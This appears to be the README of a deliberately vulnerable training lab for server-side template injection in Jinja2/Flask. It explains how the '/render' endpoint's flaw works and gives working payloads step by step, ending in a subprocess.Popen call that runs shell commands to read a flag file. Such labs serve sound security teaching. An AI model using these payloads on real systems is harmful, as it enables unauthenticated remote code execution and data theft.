# Server-Side Template Injection (SSTI)

| Field | Value |
|-------|-------|
| Technique | Server-Side Template Injection |
| Engine | Jinja2 (Python/Flask) |
| Attack | User input rendered in template context gives access to Python object hierarchy |
| Impact | Unauthenticated RCE as the app process |
| Difficulty | Medium |

## Quick Start

```bash
docker compose up --build -d
python3 exploit/exploit.py http://localhost:8080
```

Expected output:
```
[+] Flag: POC{...}
```

## How It Works

The `/render` endpoint passes `name` directly to a Jinja2 `render_string()` call. Jinja2 evaluates `{{ }}` expressions in the template context. Because Python objects are reachable through `''.__class__.__mro__[1].__subclasses__()`, an attacker can walk to `subprocess.Popen` and execute arbitrary commands.

## Manual Steps

1. Confirm SSTI: `GET /render?name={{7*7}}` returns `49`
2. Enumerate subclasses: `GET /render?name={{''.__class__.__mro__[1].__subclasses__()}}`
3. Find `subprocess.Popen` index in the returned list
4. Execute: `GET /render?name={{''.__class__.__mro__[1].__subclasses__()[N]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}`

See [docs/](docs/) and [solutions/walkthrough.md](solutions/walkthrough.md).

## Clone This Lab

```bash
git clone https://github.com/CloudRabbit1/community-labs.git
cd community-labs/ssti
docker compose up --build -d
```
